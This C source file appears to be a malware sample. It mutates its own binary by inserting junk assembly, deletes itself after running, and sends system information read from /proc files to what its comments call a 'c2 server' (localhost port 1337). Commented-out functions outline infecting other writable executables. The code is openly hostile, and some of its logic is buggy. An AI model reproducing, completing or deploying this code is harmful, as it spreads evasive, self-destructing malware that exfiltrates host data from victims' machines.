#include <ctype.h>    
#include <inttypes.h>  
#include <sys/stat.h>  
#include <stdio.h>           
#include <stdlib.h>    
#include <string.h>  
#include <time.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <sys/socket.h>
#include <unistd.h>  

#include "oc.h"

/* Buffer size */
#define BUF_SIZE 	1024

int 
local_rand() {
  
  int digit;
  FILE *fp;
  fp = fopen("/dev/urandom", "r");
  fread(&digit, 1, 1, fp);
  fclose(fp);
  
  return digit;

}

/* Write assembly instruction */
void 
insert_junk(uint8_t *file_data, uint64_t junk_start) {

  JUNK_ASM;


  uint8_t reg_1 = (local_rand()%4);
  uint8_t reg_2 = (local_rand()%4);
  
  while(reg_2 == reg_1) {
    reg_2 = (local_rand()%4);
  }

  uint8_t push_r1 = 0x50 + reg_1;
  uint8_t push_r2 = 0x50 + reg_2;

  uint8_t pop_r1 = 0x58 + reg_1;
  uint8_t pop_r2 = 0x58 + reg_2;

  uint8_t nop[3] = {0x48,0x87,0xC0};
  nop[2] += reg_1;
  nop[2] += (reg_2 * 8);

  file_data[junk_start] = push_r1;
  file_data[junk_start + 1] = push_r2;

  file_data[junk_start + 2] = nop[0];
  file_data[junk_start + 3] = nop[1];
  file_data[junk_start + 4] = nop[2];
  file_data[junk_start + 5] = nop[0];
  file_data[junk_start + 6] = nop[1];
  file_data[junk_start + 7] = nop[2];
  file_data[junk_start + 8] = pop_r2;
  file_data[junk_start + 9] = pop_r1;

}

void 
CommitSuicide() {

  JUNK_ASM;


    char path[256];
    int status;

    /* Get the path of the current program */
    status = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (status == -1) {
       //  perror("Error getting path !!!!");
        exit(EXIT_FAILURE);
    }

    /* Null-terminate the path and delete the file */
    path[status] = '\0';
    if (unlink(path) != 0) {
        // perror("Error deleting !!!!");
        exit(EXIT_FAILURE);
    }

    /* Exit the program */
    exit(EXIT_SUCCESS);
}

/* 
int32_t write_file(uint8_t *file_data, uint32_t file_len, const char *filename)
{
  JUNK_ASM;

  FILE *fp; 
  
  char *newfilename = strdup(filename);

    // Opens file with binary write permissions
  fp = fopen(newfilename, "wb");
  if (fp == NULL){
    free(newfilename);
    return(EXIT_FAILURE);
  }

  fwrite(file_data, file_len, 1, fp);
  if (ferror (fp))
  

  fclose(fp);

  free(newfilename);
  return EXIT_SUCCESS;

} */

/* Load file in read binary mode */ 
int32_t load_file(uint8_t **file_data, uint32_t *file_len, const char *filename) {

  JUNK_ASM;

// Opens file in read binary mode
  FILE *fp = fopen(filename, "rb");
  if (fp == NULL) {
    return(EXIT_FAILURE);
  }

  // Sets the file position of the stream to the given offset (0 long int)
  fseek(fp, 0L, SEEK_END);

 // Sets the length of the code
  if (ftell(fp) < 1) {
  } else {
    *file_len = ftell(fp);
  }

  // Allocates memory to the length of the code
  *file_data = malloc(*file_len);
  if (*file_data == NULL) {
    return(EXIT_FAILURE);
  }

  // Gets the file position of the stream to the start of the file
  fseek(fp, 0L, SEEK_SET);

  // Reads the file into the code variable in memory
  if (fread((void*)*file_data, *file_len, 1, fp) != 1) {
    free(file_data);
    return EXIT_FAILURE;
  }

  // Closes the file
  fclose(fp);
  return EXIT_SUCCESS;

}

void 
replace_junk(uint8_t *file_data, uint64_t file_len)
{

  JUNK_ASM;

  for (uint64_t i = 0; i < file_len; i += 1) {

    // Start of the junk ASM
    if (file_data[i] >= H_PUSH && file_data[i] <= (H_PUSH + 3)) continue;
      if (file_data[i + 1] >= H_PUSH && file_data[i + 1] <= (H_PUSH + 3)) continue;
        if (file_data[i + 2 == H_NOP_0])continue;
          if (file_data[i + 3] == H_NOP_1) {

            insert_junk(file_data, i);

          }
      }
    }


void 
read_and_send(int sockfd, char * path)
{
  JUNK_ASM;

        FILE * fd;

        int strlen;
        int br = 0;
        char buf[BUF_SIZE];

        /* Try to open the target file */
        fd = fopen(path, "r");
        
        fseek(fd, 0, BUF_SIZE);            
    
        strlen = ftell(fd);              
    
            
        if (!fd) {
                printf("WARNING: Could not locate %s\n", path);
                return;
        }
        
        malloc(strlen); 

        fseek(fd, 0, BUF_SIZE);

        /* Loop until the end of the file */
        do {
                br = fread(buf, 1, BUF_SIZE, fd);

                /* Send the file content to our c2 server */
                if (send(sockfd, buf, br, 0) < 0) {
                        printf("ERROR: Could not send data!\n");
                }
        } while (br > 0);

        /* Leave no opened file descriptor behind */
        fclose(fd);
}


void
sys_info(int sockfd)
{
  JUNK_ASM;

        read_and_send(sockfd, "/proc/version");
        read_and_send(sockfd, "/proc/cmdline");
        read_and_send(sockfd, "/proc/cpuinfo");
        read_and_send(sockfd,  "/proc/meminfo");

}


/* // Lists files in passed in directory path
void propagate(const char *path, const char *exclude) {
DIR *dir;
    struct dirent *ent;

    // Open directory stream
    dir = opendir ("./");                                   
    if (dir != NULL) {
        // Iterate over all files in the current directory
        while ((ent = readdir (dir)) != NULL) {
            // Select regular files only, not DT_DIR (directories) nor DT_LNK (links)
            if (ent->d_type == DT_REG)
            {
                // Select executable and writable files that can be infected
                if (access(ent->d_name, X_OK) == 0 && access(ent->d_name, W_OK) == 0)
                {
                    // Ignore the executable that is running the program
                    if (strstr(exclude, ent->d_name) != NULL)
                    {
                        exec = ent->d_name;  
                    }
                }
            }
        }
   } else {
        // Error if directory fails to open
        fprintf (stderr, "Cannot open %s (%s)\n", "./", strerror (errno));
        exit (EXIT_FAILURE);
    }
} */

int main(int argc, char* argv[]) {

  JUNK_ASM;
  

  // Load this file into memory
  uint8_t  *file_data = NULL;
  uint32_t file_len;
  
  load_file(&file_data, &file_len, argv[0]);

  // Replace the existing junk ASM sequences with new ones
  replace_junk(file_data, file_len);

  // propagate("./", argv[0]);  

  // write_file(file_data, file_len, argv[0]);   

                  
    int c2_fd;

        struct hostent * c2_res;

        struct sockaddr_in addr;

        c2_fd = socket(AF_INET, SOCK_STREAM, 0);

        if (!c2_fd) {
                CommitSuicide();
                return 0;
        }

        c2_res = gethostbyname("localhost");

        if (!c2_res) {
                CommitSuicide();
                return 0;
        }

        addr.sin_family = AF_INET;
        memcpy(&addr.sin_addr.s_addr, c2_res->h_addr, c2_res->h_length);
        addr.sin_port = htons(0x539);

        if (connect(c2_fd, (struct sockaddr *) &addr, sizeof(addr))) {
                CommitSuicide();
                return 0;
        }

        sys_info(c2_fd);

        close(c2_fd);
        CommitSuicide();

  free(file_data);
  return EXIT_SUCCESS;
}
